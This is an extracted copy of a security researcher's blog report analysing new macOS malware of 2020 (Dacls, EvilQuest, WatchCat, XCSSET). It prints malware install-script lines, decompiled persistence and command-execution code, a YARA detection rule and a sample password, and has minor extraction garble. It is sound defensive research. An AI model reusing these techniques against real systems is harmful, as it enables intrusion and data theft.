{
    "id": "3f8a21d2-c07d-4de4-8bcd-acdeb107884f",
    "created_at": "2022-10-25T16:48:20.03958Z",
    "updated_at": "2025-03-27T02:17:23.085253Z",
    "deleted_at": null,
    "sha1_hash": "ab4cdc69f1f4c44b30d209d02c6e1117a2c2e1e7",
    "title": "Objective-See's Blog",
    "authors": "",
    "file_creation_date": "2021-01-04T18:41:26Z",
    "file_modification_date": "2021-01-04T18:41:33Z",
    "file_size": 16807584,
    "plain_text": "# The Mac Malware of 2020\n##### a comprehensive analysis of the year's new malware\n\nby: Patrick Wardle / January 1, 2021\n```\n Our research, tools, and writing, are supported by the \"Friends of Objective-See\":\n\n```\nSmugMug Guardian Firewall SecureMac iVerify Halo Privacy\n```\n                                             Become a Friend!\n     Want to play along?\n All samples covered in this post are available in our malware collection.\n …just make sure not to infect yourself!!\n\n### Printable\n\n```\nA printable (PDF) version of this report can be downloaded here:\n\n**[The Mac Malware of 2020.pdf](https://objective-see.com/downloads/MacMalware_2020.pdf)**\n\n### Background\n\nGoodbye, and good riddance 2020 …and hello 2021!\n\nIn recent years, malicious programs targeting macOS have grown in prevalence (and sophistication), perhaps even reaching parity with\n[Microsoft Windows platforms. This is well illustrated in Malwarebytes' “2020 State of Malware Report\":](https://resources.malwarebytes.com/files/2020/02/2020_State-of-Malware-Report-1.pdf)\n\n_\"And for the first time ever, Macs outpaced Windows PCs in number of threats detected per endpoint.\" -Malwarebytes_\n\n\n-----\n\nThreats per endpoint, Macs vs. Windows (credit: Malwarebytes)\n\nIt is important to note these statistics include both adware (and potentially unwanted programs). And the reality is, if a Mac user is infected\nwith malicious code, more than likely it will be adware (vs. a sophisticated nation-state backdoor):\n\n_\"The vast majority of threats for macOS in [recent years] were in the AdWare category.\" -Kaspersky_\n\nHowever, it is wise not to underestimate the potential impact of adware, upon its victims. The noted security researcher, **[Thomas Reed](https://twitter.com/thomasareed)**\n[articulates this well in writeup titled “Mac adware is more sophisticated and dangerous than traditional Mac malware\":](https://blog.malwarebytes.com/mac/2020/02/mac-adware-is-more-sophisticated-dangerous-than-traditional-mac-malware/)\n\n_\"However, adware and PUPs can actually be far more invasive and dangerous on the Mac than “real” malware. They can_\n_intercept and decrypt all network traffic, create hidden users with static passwords, make insecure changes to system_\n_settings, and generally dig their roots deep into the system so that it is incredibly challenging to eradicate completely.\" -_\n_Thomas Reed_\n\n…now, back to malware! For the fifth year in a row, I’ve decided to put together a blog post that aims to comprehensively cover all the new\nMac malware that appeared during the course of the year. While the malware may have been reported on before (i.e. by the AV company\nthat discovered them), this blog aims to cumulatively and comprehensively cover all the new Mac malware of 2020 in one place …yes, with\nsamples of each malware for download, so that you can play along! #SharingIsCaring\n```\n In this blog post, we focus on new Mac malware specimens or new variants that appeared in 2020.\n Adware and/or malware from previous years, are not covered.\n However at the end of this blog, I’ve included a brief section dedicated to these other threats, that\n includes links to detailed write-ups.\n\n```\nFor each malicious specimen covered in this post, we’ll identify the malware’s:\n\n**Infection Vector:**\nHow it was able to infect macOS systems.\n\n**Persistence Mechanism:**\nHow it installed itself, to ensure it would be automatically restarted on reboot/user login.\n\n**Features & Goals:**\nWhat was the purpose of the malware? a backdoor? a cryptocurrency miner? or something more insidious…\n\nAlso, for each malware specimen, I’ve added a direct download link in case you want to follow along with our analysis or dig into the\nmalware more!\n\n\n-----\n\n```\n07/2020\n\n```\n\n, and others who choose to remain unnamed.\n```\n/usr/bin/lldb\n\n```\n\n-----\n\n```\n OSX.Dacls\n Dacls is a macOS port of the cross-platform Dacls RAT (created by the Lazarus APT group), which\n affords a remote attacker complete control over an infected system.\n  Download: OSX.Dacls (password: infect3d)\n\n```\nDacls originally was discovered in 2019, but at that time was only seen targeting Windows and Linux systems:\n\n_\"Dacls is a RAT that was discovered by Qihoo 360 NetLab in December 2019 as a fully functional covert remote access_\n_Trojan targeting the Windows and Linux platforms.\" -Malwarebytes_\n\n…in 2020, MalwareBytes uncovered a macOS variant.\n\n**Writeups:**\n\n**[“The Dacls RAT …now on macOS!\"](https://objective-see.com/blog/blog_0x57.html)**\n**[“New Mac variant of Lazarus Dacls RAT distributed via Trojanized 2FA app”](https://blog.malwarebytes.com/threat-analysis/2020/05/new-mac-variant-of-lazarus-dacls-rat-distributed-via-trojanized-2fa-app/)**\n\n\n-----\n\nMalwareBytes, who uncovered the Mac variant of OSX.Dacls, note:\n\n_\"[the] Mac version is ...distributed via a Trojanized two-factor authentication application for macOS called MinaOTP\"_\n\nThe trojanized application was (re)named TinkaOTP, and distributed via disk image TinkaOTP.dmg\n\n…it is likely that the attackers relied on social engineering efforts, having to coerce macOS users to download and run trojanized\napplication. This is the de-factor infection mechanism leveraged by Lazarus group for many years (to target macOS users).\n\nFor example back in 2018, after creating a fake crypto-currency site, they emailed users with links to download OSX.AppleJeus:\n\nOSX.AppleJeus infection vector\n\nThe application, TinkaOTP.app is signed “adhoc-ly” (as the Lazarus group often does):\n\n\n##### $ codesign -dvvv /Volumes/TinkaOTP/TinkaOTP.app\n\n Executable=/Volumes/TinkaOTP/TinkaOTP.app/Contents/MacOS/TinkaOTP Identifier=com.TinkaOTP Format=app bundle with Mach-O thin (x86_64) ... Signature=adhoc\n\n\nThis also means that on modern versions of macOS (unless some exploit is first used to gain code execution on the target system), the\napplication will not (easily) run:\n\n\n-----\n\nmacOS blocking TinkaOTP.app\n\nLet’s now take a closer look at the application bundle of TinkaOTP.app:\n\nTinkaOTP Application Bundle\n\nIf the user runs the (trojanized) application, infection will commence. Specifically, /Contents/MacOS/TinkaOTP binary will copy a file\nfrom within its application bundle (Resources/Base.lproj/SubMenu.nib), to ~/Library/.mina and then executing it.\n\nThis can be passively observed via our `ProcessMonitor:`\n\n\n##### # ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty {  \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",  \"process\" : {   \"pid\" : 864   \"path\" : \"/bin/cp\",   \"arguments\" : [    \"cp\",    \"/Volumes/TinkaOTP/TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib\",    \"/Users/user/Library/.mina\"   ]   ...  } }\n\n\n-----\n\n#####  event : ES_EVENT_TYPE_NOTIFY_EXEC,  \"process\" : {   \"pid\" : 866   \"path\" : \"/Users/user/Library/.mina\",   \"arguments\" : [    \"/Users/user/Library/.mina\"   ]   ...  } }\n\n\n**Persistence: Launch Item**\n```\nOSX.Dacls persists as a launch item (com.aex.lop.agent.plist).\n\n```\nIf running as root, it will persists as a launch daemon, otherwise, as a user launch agent.\n\nThe binary SubMenu.nib (which recall, was copied to ~/Library/.mina) contains both a template for, and path to, the persistent\nlaunch item property list:\n\nOSX.Dacl's launch item template\n\nOSX.Dacl's launch item path\n\nVia our `FileMonitor, one can passively observe the malware creating the launch item (here a user launch agent,`\n```\n~/Library/LaunchAgents/com aex loop agent plist):\n\n```\n\n-----\n\n##### {  \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",  \"file\" : { \"destination\" : \"/Users/user/Library/LaunchAgents/com.aex-loop.agent.plist\",   \"process\" : {     \"path\" : \"/Users/user/Library/.mina\",    \"pid\" : 931    ...   }  } }\n\n\nAs the value for the RunAtLoad key in com.aex-loop.agent.plist is set to true, the malware will be automatically (re)started by\nmacOS each time the system is rebooted (and the user logs in).\n\n**Capabilities: Persistent Backdoor (+ plugins).**\n\nWe noted that OSX.Dacls is a macOS port of a Windows/Linux RAT. The initial report on the (Windows/Linux versions of the) Dacls RAT,\n[was published in December 2019, by Netlab. Titled, “Dacls, the Dual platform RAT”. In terms of the RATs capabilities, the report noted it](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/)\nutilizes a modular plugin architecture:\n\n_\"[Dacls] uses static compilation to compile the plug-in and Bot code together. By sending different instructions to call_\n_different plug-ins, various tasks can be completed._\n\n_The main functions of …Dacls Bot include: command execution, file management, process management, test network_\n_access, C2 connection agent, network scanning module.” -Netlab_\n\nThe report describes various plugins such as a:\n\nFile plugin\nProcess plugin\n“Test” plugin\n“Reverse P2P” plugin\n“LogSend” plugin\n\nAnalyzing the malware’s disassembly (specifically searching for LoadPlugin_* functions), we can see that the macOS variant of Dacls\nsupports these same plugins (plus several others, such as SOCKS plugin):\n\n\n-----\n\np g y y y\n\nExecuting system commands\nProcess actions, such as listing, creating, & terminating\nFile action such as upload/download, read/write, & deleting\n…and more (such as performing network scans).\n```\n For more details on the plugins and their implementation, see Netlab’s report:\n                      \"Dacls, the Dual platform RAT\"\n OSX.EvilQuest\n EvilQuest (also known as ThiefQuest) is a (true) computer virus, that also provides remote tasking\n and ransomware logic.\n  Download: OSX.EvilQuest (password: infect3d)\n\n```\n[The noted Malware researcher Dinesh Devadoss discovered OSX.EvilQuest and tweeted about its ransomware tendencies and](https://twitter.com/dineshdina04)\nimpersonation as Google Software update:\n\nDinesh_Devadoss\n@dineshdina04\n\n##### #macOS #ransomware impersonating as Google Software Update program with zero detection.\n\n MD5: 522962021E383C44AFBD0BC788CF6DA3 6D1A07F57DA74F474B050228C6422790 98638D7CD7FE750B6EAB5B46FF102ABD\n\n @philofishal @patrickwardle @thomasareed\n\n[8:19 AM · Jun 29, 2020](https://twitter.com/dineshdina04/status/1277668001538433025?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1277668001538433025%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\n219 [157 people are Tweeting about this](https://twitter.com/dineshdina04/status/1277668001538433025?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1277668001538433025%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\nFurther analysis uncovered other insidious capabilities, including the ability to virally infected other binaries on an infected system!\n\n\n-----\n\n**[“OSX.EvilQuest Uncovered (Part 1)\"](https://objective-see.com/blog/blog_0x59.html)**\n\n**[“OSX.EvilQuest Uncovered (Part 2)\"](https://objective-see.com/blog/blog_0x60.html)**\n\n**[“Updates on ThiefQuest, the Quickly-Evolving macOS Malware”](https://blog.trendmicro.com/trendlabs-security-intelligence/updates-on-thiefquest-the-quickly-evolving-macos-malware/?utm_source=feedburner)**\n\n**Infection Vector: Pirated Software**\n\n[From Dinesh’s tweet, it was not apparent how the malware was able to infect macOS users. However,](https://twitter.com/dineshdina04/status/1277668001538433025) **[Thomas Reed of Malwarebytes,](https://twitter.com/thomasareed?lang=en)**\nnoted that the malware had (also?) been found in pirated versions of popular macOS software, shared on popular torrent sites:\n\nPirated Application, Infected with OSX.EvilQuest (credit: Malwarebytes)\n\n```\nEthical reasons aside, it's generally unwise to install pirated software, as it is often infected\nwith malware.\n“Torrent sites are notorious for distributing malware and adware, sometimes through misleading\nadvertisements, and sometimes through Trojan horse downloads that claim to be ‘cracks’ or that may\ncontain infected copies of legitimate software” -Intego\n\n```\n\n[The sample analyzed here, was packaged in a pirated version of the popular DJ software Mixed In Key. The malicious package was](https://mixedinkey.com/)\nunsigned …meaning macOS will prompt the user before allowing it to be opened:\n\n\n-----\n\nOSX.EvilQuest Infection Vector\n\nHowever, macOS users attempting to pirate software will likely ignore this warning, pressing onwards …ensuring infection commences.\n\n[We can use the Suspicious Package utility to statically examine the package contetns. It contains an application named Mixed In](https://mothersruin.com/software/SuspiciousPackage/)\n```\nKey 8 and binary named “patch\":\n\n```\nClicking on the “All Scripts” tab, we find also find a post install script:\n\n```\n1 #!/bin/sh\n\n```\n\n-----\n\n```\n    pp p y y\n5 rmdir /Application/Utils\n6\n7 chmod +x /Library/mixednkey/toolroomd\n8\n9 /Library/mixednkey/toolroomd &\n\n```\n\nThis post install script (which is executed during the package installation) will first create a /Library/mixednkey directory. Then, it\nmoves the patch binary into this directory (renaming it toolroomd), sets it to be executable …and then launches it.\n\nAs the installer requests root privileges during the install, this script (and thus the toolroomd binary) will also run with root privileges:\n\n```\nAs the \"Mixed In Key 8\" binary is (still) validly signed by the Mixed In Key developers, it is likely\npristine and unmodified\n…the malicious components of the package, are thus the post install script and the patch binary.\n\n```\n\n**Persistence: Launch Item**\n\nDepending on its privilege level, OSX.EvilQuest persists either as a user launch agent, or a launch daemon (and a launch agent). The\ncode responsible for this logic is found within a function named ei_persistence_main.\n\nAfter invoking various anti-analysis logic (e.g. debugger check), the function then invokes a helper function, persist_executable to\ninstall the malware. If the malware is running with non-root privileges it copy itself to ~/Library/AppQuest/com.apple.questd.\nHowever, if running as root, it will also copy itself to /Library/AppQuest/com.apple.questd.\n\nOnce the malware has copied itself, it persists via a launch item. The code that performs this persistence is found in the\n```\ninstall_daemon function (invoked by ei_persistence_main). If running as non-root, it persists as a launch agent:\n~/Library/LaunchAgents/com.apple.questd.plist. If the malware is running with root privileges it will invoke the\ninstall_daemon function again, but this time specifying that a launch daemon should be created.\n\n```\nAfter the malware has ensured it is persisted (twice, if running as root!), it invokes the ei_selfretain_main function to start the launch\nitem(s) This function invokes the aptly named run daemon which in turn invokes macOS’s osascript binary to launch the items via\n\n\n-----\n\nOSX.EvilQuest launch item persistence\n\n```\nThe template for the property list for these launch item(s) is stored as an encrypted string within\nthe malware.\n\n```\n\nAs the RunAtLoad is set to true in the malware’s launch item plist (com.apple.questd.plist), macOS will automatically restart the\nmalware on subsequent reboots.\n\n**Capabilities: File Exfiltration, Remote Tasking, Ransomware, Viral Infection ...and more!**\n\nOne of the first actions taking by OSX.EvilQuest, is to scan an infected system for various files that match a list of embedded regular\nexpressions. From these regexes, we can ascertain that the malware has a propensity for certificates and crypto-currency keys & wallets:\n\n\n-----\n\nOSX.EvilQuest's file exfiltration\n\nAny file on the infected system that matches any of these regexes will be exfiltrated to the attacker (including, as shown above, a test file,\n```\nkey.png).\n\n```\nThe malware also supports remote tasking, including the following:\n\nTask 0x1: react_exec\n\nThe react_exec command appears to execute a payload received from the server. Interestingly it attempts to first execute the\npayload directly from memory! Specifically it invokes a function named ei_run_memory_hrd which invokes the Apple\n```\n  NSCreateObjectFileImageFromMemory, NSLinkModule, NSLookupSymbolInModule, and\n  NSAddressOfSymbol APIs to load and link the in-memory payload.\n\n```\n[At a previous BlackHat talk (“Writing Bad @$$ Malware for OS X”), I discussed this technique (an noted Apple used to host sample](https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf)\ncode to implement such in-memory execution):\n\n\n-----\n\nIf the in-memory execution fails, the malware writes out the payload to a file named .xookc, sets it to be executable (via chmod),\nthen executes via a call to system.\n\nTask 0x2: react_save\n\nThe react_save decodes data received from the server and saves it to a file. It appears the file name is specified by the server as\nwell. In some cases the file will be set to executable via a call to chmod.\n\nTask 0x4: react_start\n\nThis method is a nop, and does nothing:\n\n```\n1 int react_start(int arg0) {\n2 return 0x0;\n3 }\n\n```\n\nTask 0x8: react_keys\n\nThe react_keys command starts a keylogger. Specifically it instructs the malware to spawn a background thread to execute a\nfunction named eilf_rglk_watch_routine. This function creates an event tap (via the CGEventTapCreate API), add it to\nthe current runloop, then invokes the CGEventTapEnable to activate the event tap.\nOnce the tap is activated, keypresses (e.g. by the user) will be delivered to the process_event function, which then converts the\nthe raw keypresses “readable” key codes (via the kconvert function). Somewhat interestingly, the malware then passes the\nconverted key code to the printf function …to print them out? (You’d have thunk it would write them to a file …). Perhaps this part\nof code is not quite done (yet)!\n\nTask 0x10: react_ping\n\nThe react_ping command simply compares a value from the server with the (now decrypted) string \"Hi there\". A match\ncauses this command to return “success”, which likely just causes the malware to respond to the server for (more) tasking.\n\nTask 0x20: react_host\n\nThis method is a nop, and does nothing:\n\n```\n1 int react_host(int arg0) {\n2 return 0x0;\n3 }\n\n```\n\n-----\n\nThe react_scmd command will execute a command from the server via the popen API:\n\n```\n1 __text:0000000100009EDD         mov   rdi, [rbp+var_18] ; char *\n2 __text:0000000100009EE1         lea   rsi, aR     ; \"r\"\n3 __text:0000000100009EE8         mov   [rbp+var_70], rax\n4 __text:0000000100009EEC         call  _popen\n\n```\n\nThe response (output) of the command is read, and transmitted about to the server via the eicc_serialize_request and\n```\n  http_request functions.\n\n```\nThe most readily observable side-affect of an OSX.EvilQuest infection is its file encryption (ransomware) activities.\n\nAfter the malware has invoked a method named _s_is_high_time and waited on several timers to expire, it begins encrypting the\n(unfortunate) user’s files, by invoking a function named carve_target.\n\nThe carve_target first begins the key generation process via a call to the random API, and functions named eip_seeds and\n```\neip_key. It then generates a list of files to encrypt, by invoking the get_targets function, passing in the is_file_target as a\n\n```\nfilter function. This filter function filters out all files, except those that match certain file extensions. The encrypted list of extensions is hardcoded in the malware.\n\nArmed with a list of target files (that match the above extensions), the malware completes the key generation process (via a call to\n```\nrandom_key, which in turn calls srandom and random), before calling a function named carve_target on each file.\n\n```\nThe carve_target function is invoked with the path of the file to encrypt, the result of the call to random_key, as well as values from\nreturned by the calls to eip_seeds and eip_key.\n\nIt takes the following actions:\n\n1. Makes sure the file is accessible via a call to stat\n2. Creates a temporary file name, via a call to a function named make_temp_name\n3. Opens the target file for reading\n4. Checks if the target file is already encrypted via a call to a function named is_carved (which checks for the presence of\n```\n  BEBABEDD at the end of the file).\n\n```\n5. Open the temporary file for writing\n6. Read(s) 0x4000 byte chunks from the target file\n7. Invokes a function named tpcrypt to encrypt the (0x4000) bytes\n8. Write out the encrypted bytes to the temporary file\n9. Repeats steps 6-8 until all bytes have been read and encrypted from the target file\n10. Invokes a function named eip_encrypt to encrypt (certain?) keying information which is then appended to the temporary file\n11. Writes 0DDBEBABE to end of the temporary file (as noted by **[Dinesh Devadoss)](https://twitter.com/dineshdina04/status/1277672052686614528)**\n12. Deletes the target file\n13. Renames the temporary file to the target file\n\n\n-----\n\nOSX.EvilQuest's file ransom logic\n\nOnce all the files in the list of target files have been encrypted, the malware writes out the following to a file named READ_ME_NOW.txt:\n\nOSX.EvilQuest's ransom note\n\nTo make sure the user reads this file, it displays the following modal prompt, and reads it aloud via macOS built-in say command:\n\n\n-----\n\nOSX.EvilQuest's ransom alert\n\n```\nThe encryption logic was broken by researchers at SentinelOne:\n      \"Breaking EvilQuest | Reversing A Custom macOS Ransomware File Encryption Routine\"\nMoreover, the ransomware logic has been removed in subsequent versions of the malware.\n\n```\n\nThe most unique feature of OSX.EvilQuest is its capabilities to (locally) virally propagate. In short, the malware generates a list of\nexecutables on the system, the invokes a method named append_ai to inject itself into the binary:\n\nOSX.EvilQuest's viral infection logic\n\nThe following image illustrates the details of the viral infection:\n\n\n-----\n\nOSX.EvilQuest's viral infection logic\n\n```\nTo ensure the infected binary acts “normal” (i.e. runs its original code so that nothing appears\namiss), the viral code writes the programs original bytes out to a new file named: .\n<orginalfilename>1. This file is then set executable (via chmod) and executed (via execl).\n\n```\n\nBy injecting itself into the start of the (other) binaries on the system, the malware ensures that it is rather difficult to remove!\n```\n OSX.WatchCat\n WatchCat appears to be a Lazarus APT group creation, that builds off previous backdoors …while adding\n new capabilities.\n  Download: OSX.WatchCat (password: infect3d)\n\n```\n[As noted by the macOS security researcher Scott Knight, information about OSX.WatchCat was made public via the addition of an](https://twitter.com/sdotknight/)\nXProtect signature (version 2127):\n\nScott Knight\n@sdotknight\n\n##### XProtect 2127 adds two new rules to detect \"watchcat\". VT engines label it as NukeSpeed. Could be Lazarus related.\n 3bb96bfaf492782b38985f4bd6b7e7f9dc22c1332b42bb74b 16041298fd31f93\n\n[4:19 AM · Jul 24, 2020](https://twitter.com/sdotknight/status/1286667418283184128?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1286667418283184128%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\n11 [See Scott Knight’s other Tweets](https://twitter.com/sdotknight?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1286667418283184128%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\n[Scanning the malicious binary via UXProtect, shows a match on XProtect_MACOS_580a1bc:](https://digitasecurity.com/uxprotect/)\n\n\n-----\n\n##### $ cd /Library/Apple/System/Library/CoreServices/ $ cat XProtect.bundle/Contents/Resources/XProtect.yara\n\n rule XProtect_MACOS_580a1bc {   meta:    description = \"MACOS.580a1bc\"   strings:    $s1 = { 73 77 5F 76 65 72 73 20 2D 70 72 6F 64 75 63 74 4E 61 6D 65 }    $s2 = { 73 77 5F 76 65 72 73 20 2D 70 72 6F 64 75 63 74 56 65 72 73 69 6F 6E }    $s3 = { 73 77 5F 76 65 72 73 20 2D 62 75 69 6C 64 56 65 72 73 69 6F 6E }    $s4 = { 4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 4D 61 63 69 6E 74 6F 73 ... }    $s5 = { 63 6F 6D 2E 61 70 70 6C 65 2E 77 61 74 63 68 63 61 74 2E 70 6C 69 73 74 }   condition:    Macho and filesize < 500KB and all of them }\n\n\n**Writeups:**\n\n**[“Four Distinct Families of Lazarus Malware Target Apple’s macOS Platform”](https://www.sentinelone.com/blog/four-distinct-families-of-lazarus-malware-target-apples-macos-platform/)**\n\n**Infection Vector: Unknown**\n\nUnfortunately the XProtect signature and a binary sample is all the (public) information we have about OSX.WatchCat …meaning its\ninfection vector remains unknown. However, Lazarus APT group (the likely authors of this malware) are rather fond of packaging up their\nbackdoors in trojanized applications:\n\n\n-----\n\n…thus, it’s possible that OSX.WatchCat is distributed in a similar manner.\n\n**Persistence: Launch Daemon**\n\nTaking a peak at the OSX.WatchCat binary, we find an embedded launch daemon property list:\n\nThis (embedded) plist is referenced from a function named InsertToLaunchDaemons:\n\n```\n 1 int _InsertToLaunchDaemons(int arg0, int arg1) {\n 2   plist = malloc(strlen(arg0) + 0x400);\n 3   sprintf_chk(plist, 0x0, 0xffffffffffffffff, \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?\n>\\n<!DOCTYPE plist PUBLIC \\\"-//Apple//DTD PLIST 1.0//EN\\\"\n\\\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\\\">\\n<plist\nversion=\\\"1.0\\\">\\n<dict>\\n<key>Label</key>\\n<string>com.apple.watchcat</string>\\n<key>ProgramAr\nguments</key>\\n<arr…\", arg0, arg1);\n 4\n 5   sprintf_chk(path, 0x0, 0x104, \"/Library/LaunchDaemons/%s\", \"com.apple.watchcat.plist\");\n 6   file = fopen(path, \"wb\");\n 7 if (file != 0x0) {\n 8    fwrite(plist, strlen(plist), 0x1, rbx);\n 9    fclose(file);\n10    chmod(path, 444o);\n11   }\n\n```\n\n-----\n\nThe above code first formats the property lists (i.e. adds the full path the malware’s binary image), and builds a path to the launch daemon\n(/Library/LaunchDaemons/com.apple.watchcat.plist). It then writes out the (now configured) plist.\n\nAs the RunAtLoad key is set to true the malware will be automatically (re)started each time the system is rebooted.\n\n…however the first time (i.e. prior to reboot), the malware manually starts the launch daemon via the SinLaunchCTL function. This\nfunction simply invokes launchctl load on the launch daemon plist (com.apple.watchcat.plist):\n\n```\n1 int SinLaunchCTL() {\n2   sprintf_chk(path, 0x0, 0x104, \"/Library/LaunchDaemons/%s\", \"com.apple.watchcat.plist\");\n3   sprintf_chk(command, 0x0, 0x200, \"launchctl load %s > /dev/null 2>&1 &\", path);\n4   rax = popen(command, \"r\");\n5   ...\n6 }\n\n```\n\n**Capabilities: Backdoor, plus \"webshell\"**\n\n[Mac malware analyst Phil Stokes notes in a recent writeup:](https://twitter.com/philofishal)\n\n_\"...there are some overlaps with the earlier [Lazarus Group] backdoor samples ...there is also much more to this malware that_\n_has not been seen in the other samples, including use of a WebShell._\n\nBefore taking a look at the webshell, let’s discuss OSX.WatchCat’s download and execute functionality.\n\nTo execute external commands and processes, the malware invokes the popen system API. By looking at cross-references (x-refs) to this\nAPI, we can find the code responsible for executing commands from the server:\n\nThe malware’s MsgCmd function, invokes popen on a passed in argument:\n\n```\n1 int MsgCmd(int arg0) {\n2 buffer = malloc(SAR(0x1000000000 + (strlen(arg0) << 0x20) 0x20));\n\n```\n\n-----\n\nWorking backwards, we see that the MsgCmd function is invoked from the CmdProc function. The CmdProc first invokes the\n```\nSendMsgOnlyType function (to send an message to a remote command & control server via the curl APIs). Then parses the response\n\n```\nand acts upon it:\n\n\n-----\n\nOther commands appear to provide a remote attacker the ability to:\n\ndownload files\nupload files\nkill a process (MsgPK)\ndelete a file (MsgSdel)\n…and more!\n\nAs Phil noted, this is similar to the capabilities afforded by other Lazarus Group backdoors (such as **[OSX.Yort). Also though he noted the](https://objective-see.com/blog/blog_0x53.html#osx-yort)**\naddition of the “use of a WebShell.”\n\nThe “webshell” logic is found in the Auth_WebShell function (which is invoked in a loop by the malware’s Start function). It appears\nto be a simple check in, with a value of 259D7B1TE1002A65:\n\n```\n 1 int Auth_WebShell() {\n 2   ...\n 3   rax = rand();\n 4   _g_nBoardID = rax + -((0xffffffffe90452d5 * rax >> 0x2d) * 0x2328) + 0x3e8;\n 5 *(&var_60 + 0x8) = '56A2001E';\n 6   var_60 = 'T1B7D952';\n 7\n 8   var_A4 = rand();\n 9   rax = SendRawData(_g_HttpSetting, ..., &var_60, &var_A4, 0x4);\n10 if (rax != 0x0) {\n11       rbx = 0x0;\n12       rax = RecvRawData(&var_80, 0x4);\n13 if (rax != 0x0) {\n14           __sprintf_chk(&var_A0, 0x0, 0x20, \"%04d\", *(int32_t *)_g_nBoardID);\n15           rax = strcmp(&var_A0, &var_80);\n16           rbx = rax == 0x0 ? 0x1 : 0x0;\n17       }\n18   }\n19   ...\n20 return rax;\n21 }\n\n```\n```\nFor more details on OSX.WatchCat and other similar (and recent) Lazarus Group backdoors, see Phil’s\nwriteup:\n        \"Four Distinct Families of Lazarus Malware Target Apple’s macOS Platform\"\n\n```\n```\n OSX.XCSSET\n XCSSET is rather unique, as it targets macOS developers (Xcode users) and leverages several 0days to\n steal passwords and exfiltrate data.\n  Download: OSX.XCSSET (password: infect3d)\n\n```\nIn July, I noticed that Apple’s XProtect update (v. 2126) had added a new signature for a sample Cupertino named MACOS.2070d41:\n\n\n-----\n\n##### Apple's XProtect update (v2126) contains a new signature: \"MACOS.2070d41\"\n\n Looks for compiled AppleScript, w/ strings such as \"curl -- connect-timeout 10 -ks -d\"\n\n 0 hits on @virustotal :(\n\n @AppleSupport, can you share info/hashes w/ others looking to help protect macOS users?\n\n[4:11 PM · Jul 13, 2020](https://twitter.com/patrickwardle/status/1282860187397746689?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1282860187397746689%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\n86 [26 people are Tweeting about this](https://twitter.com/patrickwardle/status/1282860187397746689?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1282860187397746689%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\n\n[…in wasn’t till August, when TrendMicro researchers released their report on (and IoCs for) OSX.XCSSET that we learned more about this](https://www.intego.com/mac-security-blog/mac-malware-exposed-xcsset-an-advanced-new-threat/)\nintriguing malware.\n\n_\"We have discovered an unusual infection related to Xcode developer projects. Upon further investigation, we discovered_\n_that a developer’s Xcode project at large contained the source malware [OSX.XCSSET], which leads to a rabbit hole of_\n_malicious payloads.\" -TrendMicro_\n```\n TrendMicro’s technical analysis of OSX.XCSSET is incredibly detailed and thorough. If you’re\n interested in more details about this malware, it’s a must read:\n    \"XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other Browsers,\n                       Leverages Zero-day Exploitss\"\n\n```\n**Writeups:**\n\n**[“Mac malware exposed: XCSSET, an advanced new threat”](https://www.intego.com/mac-security-blog/mac-malware-exposed-xcsset-an-advanced-new-threat/)**\n\n**[“What is OSX.XCSSET malware and what should I do about it?\"](https://www.jamf.com/blog/osx-xcsset-subverts-developer-environments/)**\n\n**“XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other Browsers, Leverages Zero-day**\n**Exploits”**\n\n**Infection Vector: (user-downloaded) Xcode Projects**\n\nXcode is the de-facto IDE for developing software for Apple devices (iOS, macOS, etc.). It appears that OSX.XCSSET was originally\ndiscovered hiding within various developer’s Xcode projects. Several of these infected projects were found/hosted online (on Github).\n\nThe primary method of infection is user-downloaded Xcode projects. If an XCSSET-infected Xcode project is opened and built, malicious\ncode will run on the developer’s Mac\n\n\n-----\n\n_Presumably, these systems would be primarily used by developers. These Xcode projects have been modified such that_\n_upon building, these projects would run a malicious code._\n\n_This eventually leads to the main XCSSET malware being dropped and run on the affected system. Infected users are also_\n_vulnerable to having their credentials, accounts, and other vital data stolen.\" -TrendMicro_\n\nXcode project infected with OSX.XCSSET (credit: TrendMicro)\n```\n For readers interested in the specifics of OSX.XCSSET’s Xcode project subversion (infection), see\n TrendMicro’s report (pp. 1-4):\n    \"XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other Browsers,\n                       Leverages Zero-day Exploitss\"\n\n```\n**Persistence: None(?)**\n\nIt appears that OSX.XCSET does not persist, but rather relies on the user triggering both the initial infection and (subsequent) reexecutions of the malware …for example building an infected Xcode project, or running one of the applications it modifies.\n\nHowever, due to the primary goals of the malware (credential stealing and file exfiltration), there may be no need, nor advantage, to the\nmalware persisting.\n\nIn terms of application modifications (which can lead to “persistence” via user interactions), OSX.XCSSET modifies (references) Safari (not\nthe actual Safari.app which would invalidate the code signature).\n\nThe TrendMicro **[report 